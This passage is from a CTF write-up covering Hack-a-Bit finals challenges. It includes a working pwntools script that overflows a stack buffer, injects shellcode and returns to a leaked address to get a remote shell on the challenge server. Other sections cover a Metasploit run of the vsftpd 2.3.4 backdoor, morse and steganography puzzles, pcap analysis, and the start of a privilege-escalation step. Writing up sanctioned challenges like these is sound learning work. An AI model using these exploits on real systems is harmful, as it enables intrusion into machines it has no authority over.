&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#a6e22e&#34;&gt;printf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;STACK SMASHING DETECTED... but we&amp;#39;ll allow it ;) %s&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, v4);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#a6e22e&#34;&gt;fflush&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;vulnerable_function&lt;/span&gt;(s);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Of course, the flag isn&amp;rsquo;t going to be set in our environment variable locally, so we&amp;rsquo;ll have to connect to remote to smash the stack and get the flag there.&lt;/p&gt;

  &lt;img src=&#34;./img/pwn1.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%;&#34;  /&gt;


&lt;p&gt;Huh. We don&amp;rsquo;t get the flag, or any message. Let&amp;rsquo;s actually read the decompiled code.&lt;/p&gt;
&lt;p&gt;We find out on this line &lt;code&gt;if ( !strncmp(s, s2, v3) )&lt;/code&gt;, our input is checked to see if it starts with &lt;code&gt;s2&lt;/code&gt;. If not, nothing happens. Because &lt;code&gt;s2 = &amp;quot;UNLOCK&amp;quot;;&lt;/code&gt;, we just need &lt;code&gt;&amp;quot;UNLOCK&amp;quot;&lt;/code&gt; to be at the start of our string. Trying this again, we overflow the &lt;code&gt;v9&lt;/code&gt; variable, as the &lt;code&gt;memcpy(dest, s, 0x3Cu);&lt;/code&gt; function copies 60 bytes from our buffer &lt;code&gt;s&lt;/code&gt; to &lt;code&gt;dest&lt;/code&gt;, which only holds 50 bytes, resulting in a buffer overflow which causes &lt;code&gt;v9&lt;/code&gt; to be set to anything other than 0, getting us the flag: &lt;code&gt;flag{look_like_ur_a_real_RE}&lt;/code&gt;&lt;/p&gt;

  &lt;img src=&#34;./img/pwn2.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%;&#34;  /&gt;


&lt;h2 id=&#34;bitsandbytes-125--controller-150&#34;&gt;bitsANDbytes (125) &amp;amp; Controller (150)&lt;/h2&gt;
&lt;p&gt;bitsANDbytes:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Now that you have the ability to smash the stack, it&amp;rsquo;s time to get control of the instruction pointer. Use your reverse engineering to figure out proper addresses, we&amp;rsquo;ve given you the code required to pull the flag.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Controller:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Nice, last step, you have a leak but not for the right function, how can we tackle this problem?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Okay, let me address something - remember how these challenges all used the same binary? Well, as discussed previously, the flags were stored in environment variables! That means, if we were to get a shell on the remote, we could simply read the environment variables and get all the flags!!!&lt;/p&gt;
&lt;p&gt;But first of all, let&amp;rsquo;s address the vulnerability. From before, we have a buffer overflow (BOF) vulnerability, but the max bytes we can overwrite is only 10, which usually isn&amp;rsquo;t enough to completely overwrite the return pointer &lt;code&gt;rip&lt;/code&gt; to redirect code execution.&lt;/p&gt;
&lt;p&gt;The second vulnerability lies here:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;__cdecl&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;vulnerable_function&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;src)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; dest[&lt;span style=&#34;color:#ae81ff&#34;&gt;54&lt;/span&gt;]; &lt;span style=&#34;color:#75715e&#34;&gt;// [esp+Eh] [ebp-3Ah] BYREF
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;strcpy&lt;/span&gt;(dest, src);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__cdecl&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; argc, &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;argv, &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;envp)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  ...
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;vulnerable_function&lt;/span&gt;(s);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  ...
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In &lt;code&gt;vulnerable function&lt;/code&gt;, our input &lt;code&gt;s&lt;/code&gt; is copied into &lt;code&gt;dest&lt;/code&gt;, which can only hold &lt;code&gt;54&lt;/code&gt; bytes while our input can hold up to &lt;code&gt;500&lt;/code&gt; bytes! Additionally, the function uses &lt;code&gt;strcpy&lt;/code&gt; which is dangerous as it does not check the size of what it is copying, resulting in another BOF vulnerability. Using this, we can hijack execution flow by overwriting the return address which is popped into &lt;code&gt;rip&lt;/code&gt; when the function returns, allowing us to jump to any address we want!&lt;/p&gt;
&lt;p&gt;First, lets calculate the offset - the point at which we start overwriting &lt;code&gt;rip&lt;/code&gt;.  The offset can be easily calculated using &lt;code&gt;cyclic&lt;/code&gt;, just remember to replace the first 6 characters with &amp;ldquo;UNLOCK&amp;rdquo; so the buffer overflow actually triggers! For more info: &lt;a href=&#34;https://ir0nstone.gitbook.io/notes/types/stack/de-bruijn-sequences&#34;&gt;https://ir0nstone.gitbook.io/notes/types/stack/de-bruijn-sequences&lt;/a&gt;&lt;/p&gt;

  &lt;img src=&#34;./img/pwn5.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%;&#34;  /&gt;


&lt;p&gt;And we get an offset of &lt;code&gt;62&lt;/code&gt; bytes until we overflow &lt;code&gt;rip&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Okay, with the vulnerability found, we can focus on exploiting it.&lt;/p&gt;
&lt;p&gt;There are several ways to get a shell, &lt;a href=&#34;https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/ret2libc&#34;&gt;ret2libc&lt;/a&gt; being a very common one. However, we aren&amp;rsquo;t given the libc used in this challenge, so it would be a hassle to do ret2libc. Instead, we can do something much simpler.&lt;/p&gt;
&lt;p&gt;When running &lt;code&gt;pwn checksec&lt;/code&gt; to check security features on the binary, we find that, it doens&amp;rsquo;t have security features at all&amp;hellip;&lt;/p&gt;

  &lt;img src=&#34;./img/pwn3.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%;&#34;  /&gt;


&lt;p&gt;If you&amp;rsquo;re unfamiliar with pwn (binary exploitation) and can&amp;rsquo;t spot the issue immediantly - don&amp;rsquo;t worry. In trivial CTF challenges, most of these would be turned off anyways to avoid brute forcing canaries without a leak etc, but one that is almost never turned off is this one:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;NX:       NX disabled
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;NX&lt;/code&gt; stands for &amp;ldquo;&lt;a href=&#34;https://ir0nstone.gitbook.io/notes/types/stack/no-execute&#34;&gt;No eXecute&lt;/a&gt;&amp;rdquo;, and essentially defends against shellcode. Basically, if this is turned off, the computer is unable to differentiate between data and instructions, which means that we can get it to run our own instructions that we provide it, which is extremely dangerous.&lt;/p&gt;
&lt;p&gt;In our buffer input, we can feed it &lt;a href=&#34;https://ir0nstone.gitbook.io/notes/types/stack/shellcode&#34;&gt;shellcode&lt;/a&gt; (which gives us a shell when ran as code), and buffer overflow to redirect the control flow to our input buffer, making the program run whatever code is stored in our buffer. Even more conveniently, the program actually prints the address of our buffer!&lt;/p&gt;
&lt;p&gt;Using this code here, I use &lt;a href=&#34;https://docs.pwntools.com/en/stable/&#34;&gt;pwntool&amp;rsquo;s&lt;/a&gt; very useful &lt;code&gt;shellcraft.sh()&lt;/code&gt; function to automatically use shellcode based on the binary architecture (specified by &lt;code&gt;context.binary&lt;/code&gt;), and buffer overflow for it to return to my shellcode.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;elf &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; context&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;binary &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ELF(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./corruption&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; remote(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;juieqtrsdp.final.hackabit.com&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;54321&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;offset &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;62&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;this might help too: &amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;buffer_leak &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; int(p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;strip(),&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Leak at: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;hex(buffer_leak) &lt;span style=&#34;color:#e6db74&#34;&gt;= }&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; flat(
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;UNLOCK&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    asm(shellcraft&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sh())
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; payload&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ljust(offset, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;payload &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; flat(buffer_leak&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# Offset by 6 because &amp;#34;UNLOCK&amp;#34; is 6 characters so our shellcode is further down&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(payload)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;With this script we now gain a shell and are able to execute commands on the remote server!&lt;/p&gt;

  &lt;img src=&#34;./img/pwn4.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%;&#34;  /&gt;


&lt;p&gt;And from there, we find all the flags in &lt;code&gt;start.sh&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;export HAB_CONTROLLER&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;flag&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;almost_totally_full_control&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;export HAB_COREDUMP&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;flag&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;look_like_ur_a_real_RE&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;export HAB_BITSANDBYTES&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;flag&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;big_ret2flag_energy&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Unsure if this was an intended solution or not - the intended solution for the first one seems to be to buffer overflow to jump to the first flag function (whose address is provided by the leak), and the solution for the second one seems to be to calculate the address of the second flag function based on the first flag function, or simply get the address of the function from the provided binary (&lt;code&gt;PIE&lt;/code&gt; is disabled), buffer overflow to jump there and get the flag. Nevertheless, getting a shell is more satisfying and we get all the flags at once!&lt;/p&gt;
&lt;h1 id=&#34;3-triage&#34;&gt;3. Triage&lt;/h1&gt;
&lt;p&gt;We are given a set of 4 cryptography/forensics challenges - there are 2 wireshark challenges that are linked (use same file).&lt;/p&gt;
&lt;h2 id=&#34;sluth-75&#34;&gt;Sluth (75)&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Author: Nate Singer (Helix)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;Everything in life is iterative&amp;hellip;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;NON-STANDARD FLAG FORMAT&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;We are given a (very large) file containing dots, dashes and slashes, hinting to morse code. Using cyberchef, we can decode from morse code, only to be met with more morse code! Decoding 5 times however, gives us the flag.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Note: If you encountered problems doing this challenge, it might be due to the newline at the end of the text file which may cause some decoding issues.&lt;/em&gt;&lt;/p&gt;

  &lt;img src=&#34;./img/cry1.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%;&#34;  /&gt;


&lt;p&gt;Flag: &lt;code&gt;FIVE_TIMES_0.O&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;inspector-100&#34;&gt;Inspector (100)&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Author: Nate Singer (Helix)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;It&amp;rsquo;s just a simple stream challenge, how hard can it be?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;Both challenges for this section use the same pcapng file.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;We are given a packet capture pcapng file. Following the TCP stream, we eventually find the flag at stream 48.&lt;/p&gt;

  &lt;img src=&#34;./img/cry2.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%;&#34;  /&gt;


&lt;p&gt;Flag: &lt;code&gt;flag{tcp_streams_reveal_more}&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;coverup-125&#34;&gt;Coverup (125)&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;There is a challenge hidden in coverup.jpg, extract the flag and profit.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;We are given &lt;code&gt;challenge.jpg&lt;/code&gt;. As an image file, we do some basic analysis on it - &lt;code&gt;binwalk&lt;/code&gt;, &lt;code&gt;exiftool&lt;/code&gt;, &lt;code&gt;strings&lt;/code&gt;, and &lt;code&gt;stegsolve&lt;/code&gt;. None of these really return any results, so we use &lt;code&gt;steghide&lt;/code&gt;, an image stegonography tool that can hide and extract data with passwords, which turns out to be the solution. (&lt;code&gt;stegseek&lt;/code&gt;, the program I used in the image is simply &lt;code&gt;steghide&lt;/code&gt; but can brute force passwords from a wordlist, very fast. There was no password however.)&lt;/p&gt;

  &lt;img src=&#34;./img/cry3.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%;&#34;  /&gt;


&lt;p&gt;Flag: &lt;code&gt;flag{the_truth_is_burried_deep}&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;extraction-150&#34;&gt;Extraction (150)&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Author: Nate Singer (Helix)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;Check out the pcap file, something weird is going on in here&amp;hellip;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;Both challenges for this section use the same pcapng file.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Back to the wireshark pcapng challenge - as we continue to explore the file, we find some interesting data at around TCP stream ~110-140&lt;/p&gt;

  &lt;img src=&#34;./img/cry4.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%;&#34;  /&gt;


&lt;p&gt;Hmmmm&amp;hellip; 8 characters of 0&amp;rsquo;s and 1&amp;rsquo;s, I wonder what that could be. Of course, it&amp;rsquo;s binary. We find the range of these strings to be at stream 110-140. Using wireshark, we can filter and export only these specific packets.&lt;/p&gt;

  &lt;img src=&#34;./img/cry5.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%;&#34;  /&gt;


&lt;p&gt;Going to &lt;code&gt;File &amp;gt; Export Packet Dissections &amp;gt; As Plain Text&lt;/code&gt;, we export the packet data. After a bit of formatting with regex, we can chuck the binary code into CyberChef which decodes it for us.&lt;/p&gt;

  &lt;img src=&#34;./img/cry6.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%;&#34;  /&gt;


&lt;p&gt;There are double ups due to one being the client and one being the server response. Either way, we get the flag: &lt;code&gt;flag{what_firewall?_what_IDS?}&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;4-range--zz-king-of-the-hill&#34;&gt;4. Range &amp;amp; zz. King of the Hill&lt;/h1&gt;
&lt;p&gt;These challenges involved attacking a machine, similar to &lt;a href=&#34;https://www.hackthebox.com/&#34;&gt;HackTheBox&lt;/a&gt;! There is also attack defense components of it, being linked to King of the Hill.&lt;/p&gt;
&lt;h2 id=&#34;connection-75&#34;&gt;Connection (75)&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Author: Nate Singer (Helix)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;This section is a series of challenges in a semi-isolated cyber range. Your goal is to compromise the boxes and get the flags. Your first challenge is more of a sanity-check/confirmation. We wanted to use private keys for this but logistics of distributing them was challenge so its just password login for now. Check your email, at exactly 5pm PST Friday you received a credential and IP address for this jumpbox. You can also use the connection info listed below.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;You will use this jumpbox to attack other machines in the network. We&amp;rsquo;ve installed nmap, metasploit and netcat for your convience. If you want other tooling installed later please reach out to staff and will consider those requests as you ask. Remember that you can use techniques like proxychains over SSH to emulate much of this functionality.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;From the email we recieved, we &lt;code&gt;ssh&lt;/code&gt; to the machine. Looking around, we find the flag at &lt;code&gt;/opt/flag.txt&lt;/code&gt;.&lt;/p&gt;

  &lt;img src=&#34;./img/box1.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%;&#34;  /&gt;


&lt;p&gt;Flag: &lt;code&gt;flag{welcome_to_the_range}&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;rightface-100&#34;&gt;RightFace (100)&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Author: Nate Singer (Helix)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;If you did the more advanced challenges during the qualifier this should already be familiar. Your goal here is to compromise the 10.128.0.5 machine and get access as the breakme user.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;Remember that there may be non-vulnerable services on the machine. Recon is the #1 priority. Keep this shell open once you have it, you&amp;rsquo;ll need it for Left Face.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;We are told to compromise the &lt;code&gt;10.128.0.5&lt;/code&gt; machine, and gain access as &lt;code&gt;breakme&lt;/code&gt;.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Scanning the address with &lt;code&gt;nmap&lt;/code&gt; we find it running &lt;code&gt;vsftpd 2.3.4&lt;/code&gt;. From the qualifiers, there was a same challenge where we were to the exploit the &lt;a href=&#34;https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/&#34;&gt;backdoor&lt;/a&gt; in &lt;code&gt;vsftpd 2.3.4&lt;/code&gt; to gain RCE.&lt;/p&gt;
&lt;p&gt;I chose to use Metasploit for this - never used Metasploit before this CTF, but as it came preinstalled on the machine I decided to try and I found it to be quite useful!&lt;/p&gt;

  &lt;img src=&#34;./img/box2.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%;&#34;  /&gt;


&lt;p&gt;After gaining RCE, we find &lt;code&gt;flag.txt&lt;/code&gt; in our home directory.&lt;/p&gt;
&lt;p&gt;Flag: &lt;code&gt;flag{remember_this_one?_pays_to_be_a_winner}&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;leftface-125&#34;&gt;LeftFace (125)&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Author: Nate Singer (Helix)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;With access to 10.128.0.5 your goal is to escelate priveleges to the breakme-harder user. Ultimately your goal is simply to read out the flag in /home/breakme-harder/.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;This is a continuation of the previous challenge, &lt;code&gt;RightFace&lt;/code&gt;. We are told to escalate privleges as the &lt;code&gt;breakme-harder&lt;/code&gt; user to get the flag.&lt;/p&gt;
&lt;p&gt;Upon further exploration of the machine, we find the &lt;code&gt;breakme-harder&lt;/code&gt; user and &lt;code&gt;flag.txt&lt;/code&gt; inside its directly. However, we do not have sufficient permissions to read it.&lt;/p&gt;

  &lt;img src=&#34;./img/box3.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%;&#34;  /&gt;


&lt;p&gt;Going back to our home directory, we find a file which executes with the permissions of the &lt;code&gt;breakme-harder&lt;/code&gt; user, called &lt;code&gt;escalator&lt;/code&gt;. We also find its source code, &lt;code&gt;escalator.c&lt;/code&gt;.&lt;/p&gt;

  &lt;img src=&#34;./img/box4.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%;&#34;  /&gt;


